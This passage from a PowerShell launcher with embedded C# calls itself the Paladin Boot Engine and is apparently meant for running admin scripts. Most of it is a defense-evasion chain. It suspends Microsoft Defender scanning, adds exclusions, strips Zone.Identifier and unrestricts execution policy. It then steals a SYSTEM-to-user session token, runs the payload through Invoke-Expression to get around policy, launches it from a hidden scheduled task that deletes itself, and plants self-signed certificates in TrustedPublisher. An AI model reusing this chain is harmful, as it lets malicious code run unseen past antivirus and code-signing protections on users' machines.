        [DllImport("advapi32.dll", SetLastError=true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr t);
        [DllImport("advapi32.dll", SetLastError=true)]
        static extern bool RevertToSelf();
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        static extern bool LookupPrivilegeValue(string s, string n, out LUID l);
        [DllImport("advapi32.dll", SetLastError=true)]
        static extern bool AdjustTokenPrivileges(IntPtr t, bool d, ref TOKEN_PRIVILEGES n, uint b, IntPtr p, IntPtr r);
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        static extern bool CreateProcessAsUserW(IntPtr t, string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("userenv.dll", SetLastError=true)]
        static extern bool CreateEnvironmentBlock(ref IntPtr e, IntPtr t, bool i);
        [DllImport("userenv.dll", SetLastError=true)]
        static extern bool DestroyEnvironmentBlock(IntPtr e);
        [DllImport("wtsapi32.dll", SetLastError=true)]
        static extern bool WTSQueryUserToken(uint s, out IntPtr t);
        [DllImport("wtsapi32.dll", SetLastError=true)]
        static extern int WTSEnumerateSessions(IntPtr sv, int r, int v, ref IntPtr p, ref int c);
        [DllImport("wtsapi32.dll")]
        static extern void WTSFreeMemory(IntPtr p);
        [DllImport("kernel32.dll")]
        static extern uint WTSGetActiveConsoleSessionId();
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern bool CloseHandle(IntPtr h);
        [DllImport("user32.dll")]
        static extern bool AllowSetForegroundWindow(uint dwProcessId);

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        struct STARTUPINFO {
            public int cb;
            public string lpReserved, lpDesktop, lpTitle;
            public uint dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags;
            public short wShowWindow,cbReserved2;
            public IntPtr lpReserved2,hStdInput,hStdOutput,hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION {
            public IntPtr hProcess,hThread; public uint dwProcessId,dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct WTS_SESSION_INFO {
            public uint SessionID;
            [MarshalAs(UnmanagedType.LPStr)] public string pWinStationName;
            public int State;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct LUID { public uint LowPart; public int HighPart; }
        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privilege; }

        static bool EnablePrivilege(IntPtr token, string name) {
            LUID luid;
            if (!LookupPrivilegeValue(null, name, out luid)) return false;
            var tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privilege.Luid = luid;
            tp.Privilege.Attributes = 0x00000002;
            return AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        }

        static uint GetActiveSession() {
            IntPtr p = IntPtr.Zero; int c = 0;
            if (WTSEnumerateSessions(WTS_CURRENT, 0, 1, ref p, ref c) != 0) {
                int stride = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
                for (int i = 0; i < c; i++) {
                    var info = (WTS_SESSION_INFO)Marshal.PtrToStructure(
                        (IntPtr)(p.ToInt64() + i * stride), typeof(WTS_SESSION_INFO));
                    if (info.State == 0 && info.SessionID != 0) {
                        WTSFreeMemory(p); return info.SessionID;
                    }
                }
                WTSFreeMemory(p);
            }
            uint cs = WTSGetActiveConsoleSessionId();
            return (cs == 0xFFFFFFFF) ? 0xFFFFFFFF : cs;
        }

        public static string Launch(string exe, string args, string workdir) {
            uint sid = GetActiveSession();
            if (sid == 0xFFFFFFFF) return "ERROR: No active user session";
            IntPtr procToken=IntPtr.Zero, userToken=IntPtr.Zero,
                   dupToken=IntPtr.Zero, env=IntPtr.Zero;
            bool imp = false;
            try {
                if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out procToken))
                    return "ERROR: OpenProcessToken failed: " + Marshal.GetLastWin32Error();
                EnablePrivilege(procToken, "SeTcbPrivilege");
                EnablePrivilege(procToken, "SeAssignPrimaryTokenPrivilege");
                EnablePrivilege(procToken, "SeIncreaseQuotaPrivilege");
                if (!WTSQueryUserToken(sid, out userToken))
                    return "ERROR: WTSQueryUserToken failed: " + Marshal.GetLastWin32Error();
                if (!DuplicateTokenEx(userToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out dupToken))
                    return "ERROR: DuplicateTokenEx failed: " + Marshal.GetLastWin32Error();
                if (!ImpersonateLoggedOnUser(dupToken))
                    return "ERROR: ImpersonateLoggedOnUser failed: " + Marshal.GetLastWin32Error();
                imp = true;
                CreateEnvironmentBlock(ref env, dupToken, false);
                var si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = "winsta0\\default";
                PROC
                si.dwFlags   = 0x00000001; // STARTF_USESHOWWINDOW
                si.wShowWindow = 10;       // SW_SHOWDEFAULTESS_INFORMATION pi;
                uint flags = CREATE_UNICODE_ENVIRONMENT | NORMAL_PRIORITY_CLASS;
                string cmd = String.IsNullOrEmpty(args) ? null : ("\"" + exe + "\" " + args);
                if (!CreateProcessAsUserW(dupToken, exe, cmd,
                        IntPtr.Zero, IntPtr.Zero, false, flags, env, workdir, ref si, out pi))
                    return "ERROR: CreateProcessAsUser failed: " + Marshal.GetLastWin32Error();
                AllowSetForegroundWindow(pi.dwProcessId);
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                return "OK: PID " + pi.dwProcessId;
            } finally {
                if (imp) RevertToSelf();
                if (env       != IntPtr.Zero) DestroyEnvironmentBlock(env);
                if (dupToken  != IntPtr.Zero) CloseHandle(dupToken);
                if (userToken != IntPtr.Zero) CloseHandle(userToken);
                if (procToken != IntPtr.Zero) CloseHandle(procToken);
            }
        }
    }
}
"@
    try {
        if (-not ([System.Management.Automation.PSTypeName]'SpectreBoot.SessionBridge').Type) {
            Add-Type -TypeDefinition $csharp -ErrorAction Stop
        }
        $psExePath = (Get-Process -Id $PID).Path
        $workDir   = Split-Path $TargetScript -Parent
        $launchArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$TargetScript`""
        $result = [SpectreBoot.SessionBridge]::Launch($psExePath, $launchArgs, $workDir)
        if ($result -like 'OK:*') {
            Write-BootLog 'PASS' "Session bridge launch: $result"
        } else {
            Write-BootLog 'FAIL' "Session bridge launch: $result"
        }
    } catch {
        Write-BootLog 'FAIL' "Session bridge Add-Type or launch failed: $_"
    }
}

function Show-PreflightReport {
    param(
        [hashtable]$Context,
        [hashtable]$Manifest,
        [hashtable]$PolicySnap,
        [bool]$TamperOn,
        [string]$TargetPath
    )
    Write-Host ""
    Write-Host "============================================================" -ForegroundColor White
    Write-Host "  PALADIN BOOT ENGINE v1.0.0 -- PRE-FLIGHT REPORT" -ForegroundColor White
    Write-Host "============================================================" -ForegroundColor White
    $targetName = Split-Path $TargetPath -Leaf -ErrorAction SilentlyContinue
    Write-Host ("  TARGET          : {0}" -f $targetName) -ForegroundColor Cyan
    Write-Host ("  FULL PATH       : {0}" -f $TargetPath) -ForegroundColor Gray
    $ctxStr = if ($Context.IsSystem)     { "NT AUTHORITY\SYSTEM (Session 0)" }
              elseif ($Context.IsAdmin)  { "Admin (elevated)" }
              else                       { "Standard User (not elevated)" }
    Write-Host ("  CONTEXT         : {0}" -f $ctxStr) -ForegroundColor Cyan
    Write-Host ("  USER            : {0}" -f $Context.UserName) -ForegroundColor Gray
    $gpoStr = if ($PolicySnap.GPOEnforced) {
                  "YES - {0} enforces {1}" -f $PolicySnap.GPOScope, $PolicySnap.GPOPolicy
              } else { "No" }
    Write-Host ("  EXEC POLICY     : {0} (LocalMachine)" -f $PolicySnap.LocalMachine) -ForegroundColor Cyan
    Write-Host ("  GPO ENFORCED    : {0}" -f $gpoStr) -ForegroundColor $(if ($PolicySnap.GPOEnforced) { 'Yellow' } else { 'Gray' })
    $tpStr   = if ($TamperOn) { "ON  (Layer 2 suspension blocked)" } else { "OFF (full suspension available)" }
    $tpColor = if ($TamperOn) { 'Yellow' } else { 'Green' }
    Write-Host ("  TAMPER PROTECT  : {0}" -f $tpStr) -ForegroundColor $tpColor
    $zoneStr = 'Not present'
    try {
        $z = Get-Item -LiteralPath $TargetPath -Stream 'Zone.Identifier' -ErrorAction SilentlyContinue
        if ($null -ne $z) { $zoneStr = 'Present -- will be stripped' }
    } catch { }
    Write-Host ("  ZONE IDENTIFIER : {0}" -f $zoneStr) -ForegroundColor $(if ($zoneStr -like '*Present*') { 'Yellow' } else { 'Gray' })
    Write-Host ""
    Write-Host "  PLANNED ACTIONS:" -ForegroundColor White
    $step = 1
    Write-Host ("  [{0}] Strip Zone.Identifier (always)" -f $step); $step++
    if ($Manifest.PolicyUnrestrict) {
        Write-Host ("  [{0}] Set ExecutionPolicy Unrestricted (Process scope)" -f $step); $step++
    }
    if ($Manifest.DefenderSuspend) {
        if (-not $TamperOn) {
            Write-Host ("  [{0}] Suspend Defender (RTM + ScriptScan + Behavior + IOAV)" -f $step); $step++
        }
        if ($Manifest.ExclusionAdd) {
            Write-Host ("  [{0}] Add folder exclusion" -f $step); $step++
        }
    }
    if ($Manifest.ElevateIfNeeded -and -not $Context.IsAdmin -and -not $Context.IsSystem) {
        Write-Host ("  [{0}] UAC self-elevation" -f $step); $step++
    }
    if ($Context.IsSystem -and $Manifest.SessionBridge) {
        Write-Host ("  [{0}] SYSTEM->User session bridge (CreateProcessAsUser)" -f $step); $step++
    }
    Write-Host ("  [{0}] Launch target script" -f $step); $step++
    if ($Manifest.PolicyPrompt -and -not $PolicySnap.GPOEnforced) {
        Write-Host ("  [{0}] Policy selection prompt (post-run)" -f $step); $step++
    }
    Write-Host ("  [{0}] Restore Defender to pre-launch state" -f $step)
    Write-Host ""
    Write-Host "============================================================" -ForegroundColor White
    Write-Host ""
}

function Invoke-SpectreBoot {
    [CmdletBinding()]
    param(
        [hashtable]$Manifest     = @{},
        [string]   $TargetScript = '',
        [string]   $TargetArgs   = ''
    )
    $defaults = @{
        DefenderSuspend  = $true
        ExclusionAdd     = $true
        PolicyUnrestrict = $true
        ElevateIfNeeded  = $true
        SessionBridge    = $false
        KeepExclusion    = $false
        PolicyPrompt     = $true
    }
    foreach ($key in $defaults.Keys) {
        if (-not $Manifest.ContainsKey($key)) { $Manifest[$key] = $defaults[$key] }
    }
    if ([string]::IsNullOrWhiteSpace($TargetScript)) { $TargetScript = $PSCommandPath }
    if ([string]::IsNullOrWhiteSpace($TargetScript) -or -not (Test-Path $TargetScript)) {
        Write-BootLog 'FAIL' "TargetScript not found or not specified: '$TargetScript'"
        return $false
    }
    $targetFolder  = Split-Path $TargetScript -Parent
    $targetExeName = 'powershell.exe'
    Initialize-BootLog -ScriptPath $TargetScript
    Write-BootLog 'BOOT' "Paladin Boot Engine v1.0.0 starting..."
    $ctx        = Get-BootContext
    Write-BootLog 'INFO' ("Context: {0} | Admin={1} | System={2} | UAC={3}" `
                          -f $ctx.UserName, $ctx.IsAdmin, $ctx.IsSystem, $ctx.UACEnabled)
    $policySnap = Get-PolicySnapshot
    $tpOn       = Get-TamperProtectionState
    Write-BootLog 'INFO' ("Tamper Protection: {0}" -f $(if ($tpOn) { 'ON' } else { 'OFF' }))
    Show-PreflightReport -Context $ctx -Manifest $Manifest -PolicySnap $policySnap `
                         -TamperOn $tpOn -TargetPath $TargetScript
    Remove-ZoneIdentifier -TargetPath $TargetScript | Out-Null
    if ($Manifest.PolicyUnrestrict) { Set-BootExecutionPolicy -Snapshot $policySnap }
    if ($Manifest.DefenderSuspend) {
        Suspend-Defender -TargetFolder $targetFolder `
                         -TargetExeName $targetExeName `
                         -AddExclusion $Manifest.ExclusionAdd
    }
    if ($Manifest.ElevateIfNeeded -and -not $ctx.IsAdmin -and -not $ctx.IsSystem) {
        $relaunched = Invoke-SelfElevation -TargetScript $TargetScript -OriginalArgs $TargetArgs
        if ($relaunched) {
            Write-BootLog 'INFO' "Re-launched as elevated process. This instance exiting."
            Restore-Defender -KeepExclusion $Manifest.KeepExclusion
            try { Stop-Transcript -ErrorAction SilentlyContinue } catch { }
            exit 0
        }
    }
    try {
        if ($ctx.IsSystem -and $Manifest.SessionBridge) {
            Write-BootLog 'BOOT' "Launching via SYSTEM->User session bridge..."
            Invoke-SessionBridgeLaunch -TargetScript $TargetScript
        } else {
            Write-BootLog 'PASS' "Boot sequence complete. Returning control to payload."
        }
    } finally {
        # NOTE: Invoke-PolicyPrompt intentionally NOT called here (KI-050).
        # PolicyPrompt calls Read-Host which blocks forever in a hidden scheduled task window.
        # The wrapper calls Invoke-PolicyPrompt AFTER IEX payload exits, only if manifest flag is set.
        # NOTE: Restore-BootExecutionPolicy and Stop-Transcript also NOT called here (KI-049).
        # The wrapper owns process lifetime and calls both after IEX payload exits.
        Restore-Defender -KeepExclusion $Manifest.KeepExclusion
        Write-BootLog 'BOOT' "Paladin Boot Engine shutdown complete."
    }
    return $true
}
'@

#------------------------------------------------------------------------------
# WRITE BOOT ENGINE + PAYLOAD WRAPPER TO TEMP, THEN LAUNCH ELEVATED PS
#------------------------------------------------------------------------------
function Invoke-LaunchPayload {
    param(
        [string]$PayloadPath,
        [bool]  $DefenderSuspend,
        [bool]  $ExclusionAdd,
        [bool]  $PolicyUnrestrict,
        [bool]  $ElevateIfNeeded,
        [bool]  $SessionBridge,
        [bool]  $KeepExclusion,
        [bool]  $PolicyPrompt,
        [bool]  $DoSign,
        [string]$SignerCN,
        [bool]  $AutoCreate,
        [bool]  $TrustCU,
        [bool]  $TrustLM,
        [bool]  $Timestamp,
        [int]   $CertValidityDays = 1825
    )

    $logAction = $script:LogAction  # delegate set by GUI

    $ts      = [System.DateTime]::Now.Ticks
    $tmpDir  = $env:TEMP
    $engPath = Join-Path $tmpDir "PaladinPS-Engine-$ts.ps1"
    $payPath = Join-Path $tmpDir "PaladinPS-Payload-$ts.ps1"

    # -- Write boot engine ----------------------------------------------------
    try {
        [System.IO.File]::WriteAllText($engPath, $script:BootEngineContent, [System.Text.Encoding]::UTF8)
        & $logAction 'INFO' "Engine written: $engPath"
    } catch {
        & $logAction 'FAIL' "Engine write failed: $_"
        return $false
    }

    # -- Build optional sign block ---------------------------------------------
    $signBlock = ''
    if ($DoSign -and -not [string]::IsNullOrWhiteSpace($SignerCN)) {
        $cnSafe  = $SignerCN  -replace "'", "''"
        $tgtSafe = $PayloadPath -replace "'", "''"
        $autoStr = if ($AutoCreate) { '$true' } else { '$false' }
        $cuStr   = if ($TrustCU)   { '$true' } else { '$false' }
        $lmStr   = if ($TrustLM)   { '$true' } else { '$false' }
        $tsArr   = if ($Timestamp) {
            "@('http://timestamp.digicert.com','http://timestamp.comodoca.com','http://timestamp.sectigo.com')"
        } else { "@()" }

        $signBlock = @"

# ---- AUTO SIGN -------------------------------------------------------
function SB-Drive { if (-not (Get-PSDrive -Name Cert -EA SilentlyContinue)) { New-PSDrive -Name Cert -PSProvider Certificate -Root '\' | Out-Null } }
function SB-FindCert([string]`$cn) {
    SB-Drive
    foreach (`$s in @('Cert:\CurrentUser\My','Cert:\LocalMachine\My')) {
        `$c = Get-ChildItem `$s -CodeSigningCert -EA SilentlyContinue |
             Where-Object { `$_.Subject -like "CN=`$cn*" } |
             Sort-Object NotAfter -Descending | Select-Object -First 1
        if (`$c) { return `$c }
    }
    return `$null
}
function SB-CreateSelfSigned([string]`$cn) {
    try {
        `$cert = New-SelfSignedCertificate -Subject "CN=`$cn" -KeyUsage DigitalSignature ``
            -Type CodeSigningCert -KeySpec Signature -HashAlgorithm SHA256 ``
            -NotAfter (Get-Date).AddDays($CertValidityDays) -EA Stop
        Write-BootLog 'PASS' "Self-signed cert created: CN=`$cn"
        return `$cert
    } catch {
        Write-BootLog 'FAIL' "Self-signed cert creation failed: `$_"
        return `$null
    }
}
function SB-TrustCert([System.Security.Cryptography.X509Certificates.X509Certificate2]`$cert, [bool]`$cu, [bool]`$lm) {
    if (`$cu) {
        try {
            `$s = New-Object System.Security.Cryptography.X509Certificates.X509Store('TrustedPublisher','CurrentUser')
            `$s.Open('ReadWrite'); `$s.Add(`$cert); `$s.Close()
            Write-BootLog 'PASS' "Cert trusted in CurrentUser\TrustedPublisher"
        } catch { Write-BootLog 'WARN' "CU trust failed: `$_" }
    }
    if (`$lm) {
        try {
            `$s = New-Object System.Security.Cryptography.X509Certificates.X509Store('TrustedPublisher','LocalMachine')
            `$s.Open('ReadWrite'); `$s.Add(`$cert); `$s.Close()
            Write-BootLog 'PASS' "Cert trusted in LocalMachine\TrustedPublisher"
        } catch { Write-BootLog 'WARN' "LM trust failed: `$_" }
    }
}
`$SB_CN         = '$cnSafe'
`$SB_AutoCreate = $autoStr
`$SB_TrustCU    = $cuStr
`$SB_TrustLM    = $lmStr
`$SB_TSUrls     = $tsArr
`$SB_Target     = '$tgtSafe'

Write-BootLog 'INFO' "Auto-sign: ON [CN=`$SB_CN]"
`$sigCert = SB-FindCert `$SB_CN
if (`$null -eq `$sigCert -and `$SB_AutoCreate) {
    Write-BootLog 'WARN' "No cert found for CN=`$SB_CN -- creating self-signed..."
    `$sigCert = SB-CreateSelfSigned `$SB_CN
    if (`$null -ne `$sigCert) { SB-TrustCert `$sigCert `$SB_TrustCU `$SB_TrustLM }
}
if (`$null -ne `$sigCert) {
    try {
        if (`$SB_TSUrls.Count -gt 0) {
            `$sigResult = `$null
            foreach (`$url in `$SB_TSUrls) {
                try {
                    `$sigResult = Set-AuthenticodeSignature -FilePath `$SB_Target ``
                        -Certificate `$sigCert -TimestampServer `$url -EA Stop
                    if (`$sigResult.Status -eq 'Valid') {
                        Write-BootLog 'PASS' "Signed with timestamp [CN=`$SB_CN, TS=`$url]"
                        break
                    }
                } catch { continue }
            }
            if (`$null -eq `$sigResult -or `$sigResult.Status -ne 'Valid') {
                `$sigResult = Set-AuthenticodeSignature -FilePath `$SB_Target -Certificate `$sigCert -EA Stop
                Write-BootLog 'PASS' "Signed without timestamp (all TS servers failed) [CN=`$SB_CN]"
            }
        } else {
            `$sigResult = Set-AuthenticodeSignature -FilePath `$SB_Target -Certificate `$sigCert -EA Stop
            Write-BootLog 'PASS' "Signed (no timestamp requested) [CN=`$SB_CN]"
        }
    } catch {
        Write-BootLog 'FAIL' "Signing failed: `$_"
    }
} else {
    Write-BootLog 'FAIL' "No code-signing cert available for CN=`$SB_CN -- skipping sign"
}
# ---- END AUTO SIGN ---------------------------------------------------

"@
    }

    # -- Build manifest values -------------------------------------------------
    $boolStr = { param($b) if ($b) { '$true' } else { '$false' } }
    $mDS  = & $boolStr $DefenderSuspend
    $mEA  = & $boolStr $ExclusionAdd
    $mPU  = & $boolStr $PolicyUnrestrict
    $mEIN = & $boolStr $ElevateIfNeeded
    $mSB  = & $boolStr $SessionBridge
    $mKE  = & $boolStr $KeepExclusion
    $mPP  = & $boolStr $PolicyPrompt

    $payPathSafe = $PayloadPath -replace "'", "''"

    # -- Build payload wrapper -------------------------------------------------
    $wrapperContent = @"
#Requires -Version 3.0
# Paladin PowerShell Wrapper -- auto-generated by Paladin-PowerShell-Launcher v$($script:Version)
Set-StrictMode -Off

. "$engPath"

`$BOOT_MANIFEST = @{
    DefenderSuspend  = $mDS
    ExclusionAdd     = $mEA
    PolicyUnrestrict = $mPU
    ElevateIfNeeded  = $mEIN
    SessionBridge    = $mSB
    KeepExclusion    = $mKE
    PolicyPrompt     = $mPP
}

Invoke-SpectreBoot -Manifest `$BOOT_MANIFEST -TargetScript "$payPathSafe"

$signBlock

# Run payload via IEX -- bypasses ExecutionPolicy Restricted which blocks .ps1 file invocation
# even inside a Process-scoped Bypass session (KI-047). Same process = Defender stays suspended (KI-046).
`$crashLog = 'C:\ProgramData\Paladin\Launcher\APM-Crash.log'
try {
    if (-not (Test-Path (Split-Path `$crashLog -Parent))) {
        New-Item -ItemType Directory -Force -Path (Split-Path `$crashLog -Parent) | Out-Null
    }
    [System.IO.File]::AppendAllText(`$crashLog, ("[" + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + "] LAUNCHING: $payPathSafe`r`n"))
    `$payContent = [System.IO.File]::ReadAllText("$payPathSafe")
    # Set `$PSScriptRoot so scripts that rely on it (e.g. Win11Debloat) find their support files
    `$PSScriptRoot = Split-Path "$payPathSafe" -Parent
    Invoke-Expression `$payContent
    [System.IO.File]::AppendAllText(`$crashLog, ("[" + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + "] PAYLOAD EXITED NORMALLY`r`n"))
} catch {
    `$errText = `$_.ToString() + "`r`n" + `$_.ScriptStackTrace
    [System.IO.File]::AppendAllText(`$crashLog, ("[" + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + "] PAYLOAD ERROR: " + `$errText + "`r`n"))
    [System.Windows.MessageBox]::Show(
        "APM failed to start:`r`n`r`n" + `$errText,
        "Paladin PowerShell - Payload Error", "OK", "Error") | Out-Null
} finally {
    # Payload has exited -- run policy prompt (if enabled), restore policy, stop transcript
    # PolicyPrompt guard: only call in an interactive console -- never in a hidden task (KI-050)
    if (`$BOOT_MANIFEST.PolicyPrompt) {
        try { Invoke-PolicyPrompt -Snapshot `$script:PolicySnapshot } catch { }
    }
    try { Restore-BootExecutionPolicy } catch { }
    try { Stop-Transcript -ErrorAction SilentlyContinue } catch { }
}
"@

    try {
        [System.IO.File]::WriteAllText($payPath, $wrapperContent, [System.Text.Encoding]::UTF8)
        & $logAction 'INFO' "Wrapper written: $payPath"
    } catch {
        & $logAction 'FAIL' "Wrapper write failed: $_"
        try { [System.IO.File]::Delete($engPath) } catch { }
        return $false
    }

    # -- Launch via Register-ScheduledTask with LogonType Interactive ----------
    # schtasks /RU username without password = batch logon = Session 0 = invisible window.
    # Register-ScheduledTask with LogonType Interactive runs in active desktop session.
    $taskName    = "SpectreBoot_$ts"
    $ps64        = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    & $logAction 'INFO' "Registering interactive task: $taskName as $currentUser"

    try {
        $action    = New-ScheduledTaskAction -Execute $ps64 `
                         -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payPath`""
        $principal = New-ScheduledTaskPrincipal `
                         -UserId $currentUser `
                         -LogonType Interactive `
                         -RunLevel Highest
        $settings  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Hours 4)
        $task      = New-ScheduledTask -Action $action -Principal $principal -Settings $settings

        Register-ScheduledTask -TaskName $taskName -InputObject $task -Force -ErrorAction Stop | Out-Null
        & $logAction 'PASS' "Interactive task registered"
    } catch {
        & $logAction 'FAIL' "Register-ScheduledTask failed: $_"
        try { [System.IO.File]::Delete($engPath) } catch { }
        try { [System.IO.File]::Delete($payPath) } catch { }
        return $false
    }

    try {
        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        & $logAction 'PASS' "Payload launched in interactive desktop session"
        & $logAction 'INFO' "PS window suppressed -- output bridged to launcher log panel"
    } catch {
        & $logAction 'FAIL' "Start-ScheduledTask failed: $_"
    }

    # Brief delay so task starts before we remove its definition
    Start-Sleep -Milliseconds 2000
    try {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue  # SilentlyContinue intentional -- task may not exist; missing task is not an error here
    } catch { }

    # Temp files cleaned up by the PS wrapper itself after it starts
    # (they must exist until PS loads them, so we do NOT delete here)
    return $true
}

#------------------------------------------------------------------------------
# GUI HELPERS
#------------------------------------------------------------------------------
function Add-LogEntry {
    param([string]$Level, [string]$Message)
    $ts    = Get-Date -Format 'HH:mm:ss'
    $entry = "[$ts] [$($Level.PadRight(4))] $Message"

    $color = switch ($Level) {
        'PASS' { '#00FF88' }
        'FAIL' { '#FF4444' }
        'WARN' { '#FFB800' }
        'INFO' { '#FF8C00' }
        'BOOT' { '#FFFFFF' }
        default { '#CCCCCC' }
    }

    $script:Window.Dispatcher.Invoke([Action]{
        $run = New-Object System.Windows.Documents.Run
        $run.Text       = $entry + [System.Environment]::NewLine
        $run.Foreground = [System.Windows.Media.BrushConverter]::new().ConvertFromString($color)

        $para = New-Object System.Windows.Documents.Paragraph
        $para.Inlines.Add($run)
        $para.Margin = [System.Windows.Thickness]::new(0)

        $script:LogDoc.Blocks.Add($para)
        $script:LogBox.ScrollToEnd()
    }, [System.Windows.Threading.DispatcherPriority]::Background)
}

function Clear-Log {
    $script:Window.Dispatcher.Invoke([Action]{
        $script:LogDoc.Blocks.Clear()
    }, [System.Windows.Threading.DispatcherPriority]::Background)
}

#------------------------------------------------------------------------------
# BOOT CHECKLIST HELPERS
# Each step is a PSObject with: Key, Label, IndicatorColor, TextColor, StatusText
# Update-Checklist maps incoming bridge log messages to step keys.
#------------------------------------------------------------------------------

# Step definitions -- order matches boot sequence
$script:ChecklistSteps = @(
    New-Object PSObject -Property @{ Key='zone';      Label='Strip Zone.Identifier';       IndicatorColor='#333355'; TextColor='#666688'; StatusText='--' }
    New-Object PSObject -Property @{ Key='policy';    Label='Set ExecutionPolicy';          IndicatorColor='#333355'; TextColor='#666688'; StatusText='--' }
    New-Object PSObject -Property @{ Key='defender';  Label='Suspend Defender';             IndicatorColor='#333355'; TextColor='#666688'; StatusText='--' }
    New-Object PSObject -Property @{ Key='exclusion'; Label='Add Folder Exclusion';         IndicatorColor='#333355'; TextColor='#666688'; StatusText='--' }
    New-Object PSObject -Property @{ Key='launch';    Label='Launch Target Script';         IndicatorColor='#333355'; TextColor='#666688'; StatusText='--' }
    New-Object PSObject -Property @{ Key='restore';   Label='Restore Defender';             IndicatorColor='#333355'; TextColor='#666688'; StatusText='--' }
)

function Reset-Checklist {
    $script:Window.Dispatcher.Invoke([Action]{
        foreach ($step in $script:ChecklistSteps) {
            $step.IndicatorColor = '#333355'
            $step.TextColor      = '#666688'
            $step.StatusText     = '--'
        }
        $script:IcChecklist.ItemsSource = $null
        $script:IcChecklist.ItemsSource = $script:ChecklistSteps
        $script:PnlChecklist.Visibility = [System.Windows.Visibility]::Collapsed
    }, [System.Windows.Threading.DispatcherPriority]::Normal)
}

function Show-Checklist {
    $script:Window.Dispatcher.Invoke([Action]{
        $script:IcChecklist.ItemsSource = $script:ChecklistSteps
        $script:PnlChecklist.Visibility = [System.Windows.Visibility]::Visible
    }, [System.Windows.Threading.DispatcherPriority]::Normal)
}

function Update-Checklist {
    param([string]$Level, [string]$Message)
    # Map log messages to step keys
    $key = $null
    switch -Wildcard ($Message) {
        '*Zone.Identifier*'           { $key = 'zone'      }
        '*ExecutionPolicy*'           { $key = 'policy'    }
        '*Defender*'                  { $key = 'defender'  }
        '*exclusion*'                 { $key = 'exclusion' }
        '*Boot sequence complete*'    { $key = 'launch'    }
        '*payload*launch*'            { $key = 'launch'    }
        '*Restore*Defender*'          { $key = 'restore'   }
        '*pre-launch state*'          { $key = 'restore'   }
        '*shutdown complete*'         { $key = 'restore'   }
    }
    if ($null -eq $key) { return }

    $indColor  = switch ($Level) {
        'PASS' { '#00FF88' }
        'WARN' { '#FFB800' }
        'FAIL' { '#FF4444' }
        'INFO' { '#FF8C00' }
        default { '#666688' }
    }
    $txtColor  = switch ($Level) {
        'PASS' { '#CCFFCC' }
        'WARN' { '#FFF0AA' }
        'FAIL' { '#FFCCCC' }
        'INFO' { '#AADDFF' }
        default { '#888888' }
    }
    $statusTxt = switch ($Level) {
        'PASS' { 'PASS' }
        'WARN' { 'WARN' }
        'FAIL' { 'FAIL' }
        'INFO' { 'OK'   }
        default { '--'  }
    }

    $script:Window.Dispatcher.Invoke([Action]{
        $step = $script:ChecklistSteps | Where-Object { $_.Key -eq $key } | Select-Object -First 1
        if ($null -ne $step) {
            $step.IndicatorColor = $indColor
            $step.TextColor      = $txtColor
            $step.StatusText     = $statusTxt
            # Force ItemsControl refresh (PSObject properties don't raise INotifyPropertyChanged)
            $script:IcChecklist.ItemsSource = $null
            $script:IcChecklist.ItemsSource = $script:ChecklistSteps
        }
    }, [System.Windows.Threading.DispatcherPriority]::Normal)
}

#------------------------------------------------------------------------------
# NAMED PIPE CLIENT (AGENT MODE)
# Used when launcher was surfaced by Paladin-Boot-Runner.ps1 from SYSTEM.
# The SYSTEM-side runner hosts \\.\pipe\PaladinAgent.
# These functions let the GUI send script execution requests through the pipe
# and stream output back into the log panel -- no UAC, no new task needed.
#
# Protocol: newline-delimited JSON (same contract as Paladin-Boot-Runner.ps1)
#   SEND:    {"cmd":"run","script":"C:\\path\\foo.ps1","args":""}
#   RECEIVE: {"type":"out","data":"..."} repeated
#            {"type":"err","data":"..."} on stderr
#            {"type":"done","data":"","exit":0} always last
#   PING:    {"cmd":"ping"}  -> {"type":"pong","data":"PaladinAgent 1.0.0"}
#------------------------------------------------------------------------------

function Test-AgentPipe {
    <#
    .SYNOPSIS
    Pings the SYSTEM runner pipe. Returns $true if alive, $false otherwise.
    #>
    try {
        $pipe = New-Object System.IO.Pipes.NamedPipeClientStream(
            '.', $script:PipeName,
            [System.IO.Pipes.PipeDirection]::InOut,
            [System.IO.Pipes.PipeOptions]::None)
        $pipe.Connect(3000)  # 3-second timeout

        $writer = New-Object System.IO.StreamWriter($pipe, [System.Text.Encoding]::UTF8)
        $reader = New-Object System.IO.StreamReader($pipe, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        $writer.WriteLine('{"cmd":"ping"}')
        $response = $reader.ReadLine()

        $reader.Dispose()
        $writer.Dispose()
